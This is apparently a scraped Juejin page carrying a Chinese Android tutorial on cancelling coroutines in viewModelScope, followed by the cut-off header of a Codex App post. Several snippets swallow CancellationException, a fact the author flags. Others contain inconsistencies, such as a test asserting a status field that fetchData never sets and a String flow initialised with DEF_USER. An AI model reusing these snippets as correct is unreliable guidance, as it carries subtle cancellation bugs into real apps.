itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何正确取消 ViewModel 里的协程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1046390797768519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    RockByte
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T00:29:49.000Z" title="Wed Feb 04 2026 00:29:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{font-family:-apple-system,BlinkMacSystemFont,PingFang SC,Helvetica Neue,Helvetica,Arial,sans-serif;word-break:break-word;line-height:1.75;font-weight:200;font-size:16px;overflow-x:hidden;color:#666;letter-spacing:.5px}.markdown-body a{text-decoration:none;color:#0064c8;position:relative}.markdown-body a:after{content:"";position:absolute;bottom:-2px;left:0;width:100%;height:1px;background-color:rgba(0,100,200,.7);transform:scale(0);transition:all .4s ease-in-out}.markdown-body a:link:hover:after{transform:scale(1)}.markdown-body code{padding:2px 4px;font-size:.9em;font-family:Menlo,Monaco,Consolas,Courier New,monospace;border-radius:2px;background-color:rgba(0,46,70,.0431);color:#39f}.markdown-body strong{font-weight:400}.markdown-body em{color:#ff6a00}.markdown-body del,.markdown-body s{color:#bbb}.markdown-body small{font-size:.8em;color:#bbb}.markdown-body kbd{margin:0 .1em;padding:5px 8px 3px;border:1px solid #d1d5d9;border-radius:3px;box-shadow:0 1px 0 0 #e3e4e6,inset 0 0 0 2px #fff;background-color:#eee;font-weight:600;font-size:.8em;font-family:Arial,Helvetica Neue,Helvetica,sans-serif;white-space:nowrap;color:#666}.markdown-body kbd:first-child{margin-left:0}.markdown-body kbd:last-child{margin-right:0}.markdown-body img{display:block;border:0;max-width:calc(100% - 20px);min-width:20px;min-height:20px;margin:0 10px;box-shadow:0 2px 8px 2px rgba(0,0,0,.2);transition:all .25s ease-in-out}.markdown-body img:hover{transform:translateY(-4px)}.markdown-body blockquote,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{line-height:inherit;font-size:inherit;color:inherit}.markdown-body blockquote:first-child,.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child,.markdown-body ol:first-child,.markdown-body p:first-child,.markdown-body pre:first-child,.markdown-body table:first-child,.markdown-body ul:first-child{margin-top:0}.markdown-body blockquote:last-child,.markdown-body h1:last-child,.markdown-body h2:last-child,.markdown-body h3:last-child,.markdown-body h4:last-child,.markdown-body h5:last-child,.markdown-body h6:last-child,.markdown-body ol:last-child,.markdown-body p:last-child,.markdown-body pre:last-child,.markdown-body table:last-child,.markdown-body ul:last-child{margin-bottom:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:1.6em 0 .6em;color:#333;font-weight:400;position:relative}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{position:absolute;left:-2em}.markdown-body h1{font-size:1.75em}.markdown-body h1:before{content:"#"}.markdown-body h1:first-child{margin-top:0}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.35em}.markdown-body h4{font-size:1.2em}.markdown-body h5{font-size:1.1em}.markdown-body h6{font-size:1em}.markdown-body blockquote,.markdown-body ol,.markdown-body pre,.markdown-body table,.markdown-body ul{margin:1em 0}.markdown-body p{margin:.7em 0;word-break:break-word}.markdown-body pre{padding:8px 12px;color:#666;background-color:rgba(0,46,70,.0431);border:1px solid #ebebeb;tab-size:4;white-space:pre-wrap;line-height:1.4}.markdown-body pre code{color:inherit;background-color:transparent;padding:0}.markdown-body ol,.markdown-body ul{margin:1em 0 1em 2em;padding:0;line-height:1.5!important;font-size:inherit;color:inherit}.markdown-body ol:first-child,.markdown-body ul:first-child{margin-top:0}.markdown-body ol:last-child,.markdown-body ul:last-child{margin-bottom:0}.markdown-body ol li,.markdown-body ul li{margin:.5em 0;list-style:inherit}.markdown-body ul{list-style:disc outside}.markdown-body ul ul{list-style-type:circle}.markdown-body ul ul ul{list-style-type:square}.markdown-body ol{list-style:decimal outside}.markdown-body ol ol{list-style-type:lower-alpha}.markdown-body ol ol ol{list-style-type:lower-roman}.markdown-body blockquote{font-size:.9em;padding:8px 20px 8px 15px;color:#666;border-left:5px solid rgba(0,100,200,.7);background-color:rgba(0,100,200,.1)}.markdown-body table{border-collapse:collapse;border-spacing:0;max-width:100%;min-width:50%;word-wrap:break-word;color:inherit}.markdown-body table thead tr{background-color:#f4f6f7}.markdown-body table td,.markdown-body table th{padding:4px 16px;font-size:.95em;text-align:left;color:inherit;border:0;min-width:72px}.markdown-body table td[align=center],.markdown-body table th[align=center]{text-align:center}.markdown-body table td[align=right],.markdown-body table th[align=right]{text-align:right}.markdown-body table th{border-bottom:2px solid #e3e4e6;color:#333;font-weight:400;white-space:nowrap}.markdown-body table td{border-bottom:1px solid #ebebeb}.markdown-body hr{margin:1.5em 0;padding:0;border:0;background:linear-gradient(90deg,rgba(0,46,70,.0431),#ebebeb 50%,rgba(0,46,70,.0431));height:1px}.markdown-body br{content:"";display:block}</style><style data-highlight="" data-highlight-key="xcode">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#000}.xml .hljs-meta{color:silver}.hljs-comment,.hljs-quote{color:#007400}.hljs-attribute,.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-tag{color:#aa0d91}.hljs-template-variable,.hljs-variable{color:#3f6e74}.hljs-code,.hljs-meta-string,.hljs-string{color:#c41a16}.hljs-link,.hljs-regexp{color:#0e0eff}.hljs-bullet,.hljs-number,.hljs-symbol,.hljs-title{color:#1c00cf}.hljs-meta,.hljs-section{color:#643820}.hljs-built_in,.hljs-builtin-name,.hljs-class .hljs-title,.hljs-params,.hljs-type{color:#5c2699}.hljs-attr{color:#836c28}.hljs-subst{color:#000}.hljs-formula{background-color:#eee;font-style:italic}.hljs-addition{background-color:#baeeba}.hljs-deletion{background-color:#ffc8bd}.hljs-selector-class,.hljs-selector-id{color:#9b703f}.hljs-doctag,.hljs-strong{font-weight:700}.hljs-emphasis{font-style:italic}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9c242af436549feb356a83a5d210f54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769789&amp;x-signature=B%2B3HYeFBUGjLyg%2F2%2FyV7t5iLOLU%3D" alt="0.png" loading="lazy"/></p>
<p>昨天，我写过这样<a href="https://juejin.cn/post/7602072652607602728" target="_blank" title="https://juejin.cn/post/7602072652607602728">一篇文章</a>，里面讲述了一个可能 90% 的开发者都答不上来问题。</p>
<p>中午我和同事吃饭的时候，他问我：然后呢，你就水一篇文章不给解决方案？你知道程序员流行一句什么样的话吗？——留图不留种，xx万人x。</p>
<p>OK，打住！</p>
<p>这里，我们从 <code>viewModelScope</code> 入手，看看这个取消的问题！</p>
<h2 data-id="heading-0">viewModelScope</h2>
<p>我知道，作为一名安卓开发者，都曾花费无数时间调试各种诡异的崩溃问题和内存泄漏，而这些问题的根源往往都指向协程处理不当。</p>
<p>如果使用 <code>Kotlin</code> 协程，大概率对 <code>viewModelScope</code> 并不陌生。</p>
<p>它是将协程与 <code>ViewModel</code> 生命周期绑定的绝佳工具，但如果取消操作处理不当，麻烦便会接踵而至。</p>
<p>泄漏的协程会持续占用资源、浪费 <code>CPU</code> 算力，更糟的是，还可能导致应用行为异常。</p>
<p>在本文中，我将分享自己摸索出的 <code>viewModelScope</code> 取消操作实战经验，结合具体示例和技巧，避免被“xx万人x”。</p>
<h2 data-id="heading-1">为何取消操作至关重要</h2>
<p><code>viewModelScope</code> 是与 <code>ViewModel</code> 生命周期绑定的协程作用域。</p>
<p>当 <code>ViewModel</code> 被销毁时（比如关联的 <code>Activity</code> 或 <code>Fragment</code> 销毁），该作用域会自动取消所有关联的协程。</p>
<p>听起来很完美？</p>
<p>但关键问题在于：自动取消不代表可以高枕无忧。稍不注意，协程仍可能超时运行、占用资源，或触发未捕获异常导致应用崩溃。</p>
<p><em>还记得之前的文章的那句话吗？协程的取消是协作的。</em></p>
<p>规范的取消操作能确保应用始终轻量、行为可预测，尤其是在配置变更或进程终止的场景下。</p>
<p>接下来，我们聊聊如何专业地管理 <code>viewModelScope</code> 的取消逻辑。</p>
<h2 data-id="heading-2">理解 viewModelScope</h2>
<p><code>viewModelScope</code> 是 <code>androidx.lifecycle:lifecycle-viewmodel-ktx</code> 库提供的属性，本质是绑定到 <code>Dispatchers.Main</code> 主线程、且与 <code>ViewModel</code> 生命周期关联的 <code>CoroutineScope</code>。</p>
<p>当 <code>ViewModel</code> 的 <code>onCleared()</code> 方法被调用时，该作用域会取消所有协程。</p>
<p>这对 <code>Android</code> 开发而言堪称绝配——毕竟 <code>UI</code> 组件的生命周期本就多变，但这一切的前提是，你编写的代码要具备“取消感知”能力。</p>
<p>以下是使用 <code>viewModelScope</code> 的简单 <code>ViewModel</code> 示例：</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchData</span><span class="hljs-params">()</span></span> {
        viewModelScope.launch {
            <span class="hljs-keyword">val</span> <span class="hljs-keyword">data</span> = fetchDataFromNetwork() <span class="hljs-comment">// 挂起函数</span>
            <span class="hljs-comment">// 更新UI</span>
        }
    }
}
</code></pre>
<p>当 <code>ViewModel</code> 被销毁（比如用户跳转页面），协程会被取消。</p>
<p>但如果 <code>fetchDataFromNetwork()</code> 是耗时操作，情况会如何？</p>
<h2 data-id="heading-3">取消操作不当的常见陷阱</h2>
<p>在我早期的项目中，我曾以为 <code>viewModelScope</code> 能“魔法般”处理所有问题，实际上根本不可能。</p>
<p>以下是我踩过的典型坑：</p>
<ol>
<li><strong>不可取消的操作</strong>：部分挂起函数（如第三方库调用）不响应取消指令，导致资源持续占用。或者，你调用的函数就是一个普通函数，根本不是挂起函数，不可能响应取消指令；</li>
<li><strong>资源泄漏</strong>：若协程持有 <code>Context</code> 或 <code>View</code> 的引用，即便取消协程也无法释放资源，最终引发内存泄漏；</li>
<li><strong>未捕获异常</strong>：协程取消过程中若抛出未处理的 <code>CancellationException</code>，可能直接导致应用崩溃。</li>
</ol>
<h2 data-id="heading-4">题外话</h2>
<p>其实早期对于线程我也是这么理解的，我们翻看一下现在的 Java 线程的源码：</p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-meta">@Deprecated(
    since = "1.2",
    forRemoval = true
)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">interrupt</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span> != currentThread()) {
        <span class="hljs-built_in">this</span>.checkAccess();
    }

    <span class="hljs-built_in">this</span>.interrupted = <span class="hljs-literal">true</span>;
    <span class="hljs-built_in">this</span>.interrupt0();
    <span class="hljs-comment">//...</span>
}
</code></pre>
<p><code>stop</code> 已经是一个弃用且不可用的接口了。</p>
<p>刚学 Java 的我一直以为，如果我调用 <code>stop</code> 或者 <code>interrupt</code>，Java 一定会完美的帮我取消线程，释放资源。但实际上我们需要写额外的代码来达成这一步，例如判断 <code>interrupted</code> 标志位。</p>
<p>题外话结束，接下来，我们看看如何解决取消操作不当的问题。</p>
<h2 data-id="heading-5">编写支持取消的挂起函数</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4074f668c159463a8e31aeae9a229d66~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769789&amp;x-signature=CKTSF1VeJh4qxqWnP4AA7W0FRyg%3D" alt="1.png" loading="lazy"/></p>
<p><strong>并非所有挂起函数都天生支持取消</strong>。</p>
<p>如果调用的是非挂起的阻塞式 <code>API</code>（如遗留库），需通过包装让其响应取消指令，可使用 <code>isActive</code> 或 <code>yield()</code> 检查取消状态。</p>
<p>以下是支持取消的挂起函数示例：</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchDataFromNetwork</span><span class="hljs-params">()</span></span>: String = withContext(Dispatchers.IO) {
    <span class="hljs-comment">// 模拟耗时网络请求</span>
    <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.10</span>) {
        <span class="hljs-keyword">if</span> (!isActive) <span class="hljs-keyword">return</span><span class="hljs-symbol">@withContext</span> <span class="hljs-string">"已取消"</span> <span class="hljs-comment">// 取消则退出</span>
        delay(<span class="hljs-number">1000</span>) <span class="hljs-comment">// 模拟网络延迟</span>
    }
    <span class="hljs-string">"数据获取成功"</span>
}
</code></pre>
<p>该函数中，<code>isActive</code> 会检查协程是否仍处于活跃状态。当 <code>ViewModel</code> 被销毁时，<code>isActive</code> 变为 <code>false</code>，函数会提前退出。</p>
<h2 data-id="heading-6">遵循结构化并发原则</h2>
<p><strong>结构化并发能确保子协程随父作用域取消而取消</strong>。</p>
<p><code>viewModelScope</code> 本身已遵循这一原则，但启动嵌套协程时仍需刻意注意：避免使用 <code>GlobalScope</code>，因其不绑定任何生命周期，通常比 <code>ViewModel</code> 存活更久。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _data = MutableLiveData&lt;String&gt;()
    <span class="hljs-keyword">val</span> <span class="hljs-keyword">data</span>: LiveData&lt;String&gt; = _data

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchMultipleData</span><span class="hljs-params">()</span></span> {
        viewModelScope.launch {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">val</span> result1 = async { fetchDataFromNetwork() }.await()
                <span class="hljs-keyword">val</span> result2 = async { fetchDataFromNetwork() }.await()
                _data.value = <span class="hljs-string">"<span class="hljs-variable">$result1</span>, <span class="hljs-variable">$result2</span>"</span>
            } <span class="hljs-keyword">catch</span> (e: CancellationException) {
                _data.value = <span class="hljs-string">"操作已取消"</span>
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                _data.value = <span class="hljs-string">"错误：<span class="hljs-subst">${e.message}</span>"</span>
            }
        }
    }
}
</code></pre>
<p>此处的 <code>async</code> 协程是 <code>viewModelScope.launch</code> 代码块的子协程，当 <code>ViewModel</code> 被销毁时，所有子协程会自动取消。</p>
<p><em>针对 <code>CancellationException</code> 的正确做法应该是重新抛出，不过这里只是为了展示当前函数的取消逻辑，所以并没有这么做，文章的后续部分将依然采用这种做法，但是亲爱的读者们，你们要知道这个地方这么做是有待商榷的。</em></p>
<h2 data-id="heading-7">处理取消异常</h2>
<p>协程取消时会抛出 <code>CancellationException</code>，这是正常行为，但必须妥善处理以避免意外崩溃。建议始终将协程代码包裹在 <code>try-catch</code> 块中。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _status = MutableLiveData&lt;String&gt;()
    <span class="hljs-keyword">val</span> status: LiveData&lt;String&gt; = _status

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">performLongRunningTask</span><span class="hljs-params">()</span></span> {
        viewModelScope.launch {
            <span class="hljs-keyword">try</span> {
                _status.value = withContext(Dispatchers.IO) {
                    <span class="hljs-comment">// 耗时任务</span>
                    delay(<span class="hljs-number">5000</span>)
                    <span class="hljs-string">"任务完成"</span>
                }
            } <span class="hljs-keyword">catch</span> (e: CancellationException) {
                _status.value = <span class="hljs-string">"任务已取消"</span>
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                _status.value = <span class="hljs-string">"错误：<span class="hljs-subst">${e.message}</span>"</span>
            }
        }
    }
}
</code></pre>
<p>这能确保 <code>ViewModel</code> 销毁时，应用优雅处理取消操作，并同步更新 <code>UI</code> 状态。</p>
<h2 data-id="heading-8">避免持有 UI 组件引用</h2>
<p><code>viewModelScope</code> 中的协程若不慎持有 <code>Activity</code> 或 <code>Fragment</code> 的引用，极易引发内存泄漏。</p>
<p>比如向挂起函数传递 <code>Context</code>，可能导致<code>Activity</code> 在取消后仍无法释放。建议改用依赖注入，或显式传递数据。</p>
<p>❌ 错误示例：</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">badFetch</span><span class="hljs-params">(activity: <span class="hljs-type">Activity</span>)</span></span> {
        viewModelScope.launch {
            <span class="hljs-comment">// 持有Activity引用易导致泄漏</span>
            activity.showToast(fetchDataFromNetwork())
        }
    }
}
</code></pre>
<p>✅ 优化方案：</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _toastMessage = MutableStateFlow&lt;String&gt;(<span class="hljs-string">""</span>)
    <span class="hljs-keyword">val</span> toastMessage: Flow&lt;String&gt; = _toastMessage

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchAndNotify</span><span class="hljs-params">()</span></span> {
        viewModelScope.launch {
            _toastMessage.value = fetchDataFromNetwork()
        }
    }
}
</code></pre>
<p>在 <code>Activity</code> 中观察 <code>toastMessage</code> 并显示弹窗，实现协程与 <code>UI</code> 解耦。</p>
<h2 data-id="heading-9">测试取消行为</h2>
<p>取消逻辑的测试虽有难度，但至关重要。可使用 <code>kotlinx-coroutines-test</code> 库的 <code>runBlockingTest</code> 模拟单元测试中的取消场景：</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-meta">@Test</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> `fetchData cancels correctly`<span class="hljs-params">()</span></span> = runBlockingTest {
    <span class="hljs-keyword">val</span> viewModel = MyViewModel()
    <span class="hljs-keyword">val</span> job = viewModel.viewModelScope.launch {
        viewModel.fetchData()
    }
    job.cancel()
    assertEquals(<span class="hljs-string">"任务已取消"</span>, viewModel.status.value)
}
</code></pre>
<p>这能确保协程取消时能正确清理资源。</p>
<h2 data-id="heading-10">实战</h2>
<p>如果需求需要实现“获取用户数据 → 处理数据 → 更新 <code>UI</code>”的流程，同时要适配配置变更和潜在的取消操作，以下是一个典型的实现方案：</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserViewModel</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> apiService: ApiService) : ViewModel() {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _userData = MutableStateFlow&lt;User&gt;(DEF_USER)
    <span class="hljs-keyword">val</span> userData: Flow&lt;User&gt; = _userData
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _error = MutableStateFlow&lt;String&gt;(DEF_USER)
    <span class="hljs-keyword">val</span> error: Flow&lt;String&gt; = _error

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchUserProfile</span><span class="hljs-params">(userId: <span class="hljs-type">String</span>)</span></span> {
        viewModelScope.launch {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">val</span> user = withContext(Dispatchers.IO) {
                    ensureActive() <span class="hljs-comment">// 执行前检查取消状态</span>
                    <span class="hljs-keyword">val</span> rawData = apiService.getUser(userId)
                    processUserData(rawData) <span class="hljs-comment">// 耗时处理操作</span>
                }
                _userData.value = user
            } <span class="hljs-keyword">catch</span> (e: CancellationException) {
                _error.value = <span class="hljs-string">"用户数据获取已取消"</span>
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                _error.value = <span class="hljs-string">"获取用户数据失败：<span class="hljs-subst">${e.message}</span>"</span>
            }
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">processUserData</span><span class="hljs-params">(rawData: <span class="hljs-type">RawUserData</span>)</span></span>: User {
        <span class="hljs-keyword">return</span> withContext(Dispatchers.Default) {
            ensureActive() <span class="hljs-comment">// 处理过程中检查取消状态</span>
            <span class="hljs-comment">// 模拟复杂数据处理</span>
            delay(<span class="hljs-number">2000</span>)
            User(rawData.id, rawData.name)
        }
    }
}
</code></pre>
<p>核心要点：</p>
<ul>
<li><code>ensureActive()</code> 会在协程取消时抛出 <code>CancellationException</code>，让函数具备取消感知能力；</li>
<li><code>Dispatchers.IO</code> 和 <code>Dispatchers.Default</code> 确保耗时操作脱离主线程；</li>
<li>通过 <code>Flow</code> 传递错误和取消状态，保持 <code>UI</code> 同步。</li>
</ul>
<h2 data-id="heading-11">避坑指南</h2>
<ol>
<li><strong>忽略取消检查</strong>：耗时挂起函数中务必通过 <code>isActive</code> 或 <code>ensureActive()</code> 检查取消状态；</li>
<li><strong>滥用 GlobalScope</strong>：坚持使用 <code>viewModelScope</code>，确保协程与生命周期绑定。如果你的代码中出现了 <code>GlobalScope</code>，你的代码一定有问题；</li>
<li><strong>忘记处理异常</strong>：务必将 <code>CancellationException</code> 与其他异常分开捕获，更通用的做法就是重新抛出；</li>
<li><strong>阻塞主线程</strong>：非 <code>UI</code> 操作需通过 <code>withContext</code> 切换到合适的调度器。</li>
</ol>
<h2 data-id="heading-12">总结</h2>
<p>掌握 <code>viewModelScope</code> 取消操作的核心，在于理解生命周期、编写支持取消的代码，并优雅处理边界情况。</p>
<p>遵循这些最佳实践——编写协作式挂起函数、利用结构化并发、妥善处理异常、避免持有 <code>UI</code> 引用，你就能开发出健壮且高效的 <code>Android</code> 应用。</p>
<p>下次遇到莫名的内存泄漏或崩溃时，不妨检查一下协程：往往只需做好取消处理，就能解决问题。</p>
<p>我马上把这篇文章发给我的同事，免得后患无穷。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Codex App 发布：自动化 + Skills，让工作交给智能体]]></title>    <link>https://juejin.cn/post/7602553969970675766</link>    <guid>https://juejin.cn/post/7602553969970675766</guid>    <pubDate>2026-02-04T08:56:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602553969970675766" data-draft-id="7602553969970659382" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Codex App 发布：自动化 + Skills，让工作交给智能体"/> <meta itemprop="keywords" content="后端,程序员,产品"/> <meta itemprop="datePublished" content="2026-02-04T08:56:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="摆烂工程师"/> <meta itemprop="url" content="https://juejin.cn/user/1552933235470589"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Codex App 发布：自动化 + Skills，让工作交给智能体
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1552933235470589/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    摆烂工程师
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T08:56:28.000Z" title="Wed Feb 04 2026 08:56:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body 